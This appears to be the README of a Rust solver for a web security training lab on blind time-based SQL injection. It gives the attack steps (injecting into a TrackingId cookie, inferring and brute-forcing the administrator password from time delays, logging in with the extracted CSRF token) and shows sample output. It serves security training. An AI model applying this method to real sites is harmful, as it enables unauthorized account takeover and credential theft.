# Hack Steps

1. Inject payload into 'TrackingId' cookie to determine the length of administrator's password based on time delays
2. Modify the payload to brute force the administrator's password 
3. Fetch the login page
4. Extract the csrf token and session cookie
5. Login as the administrator
6. Fetch the administrator profile

# Run Script

1. Change the URL of the lab
2. Start script

```
~$ cargo run
```

# Expected Output

```
[#] Injection point: TrackingId
1. Checking if password length = 20 [ Correct length: 20 ]
2. Brute forcing password.. (60%): wf c v6 s 2g or n2  
2. Brute forcing password.. (85%): wf0c v6 s 2gior6n28i
                   ................
2. Brute forcing password.. (100%): wf0chv6vs82gior6n28i
3. Fetching login page.. OK
4. Extracting the csrf token and session cookie.. OK
5. Logging in as the administrator.. OK
6. Fetching the administrator profile.. OK
🗹 The lab should be marked now as solved
```
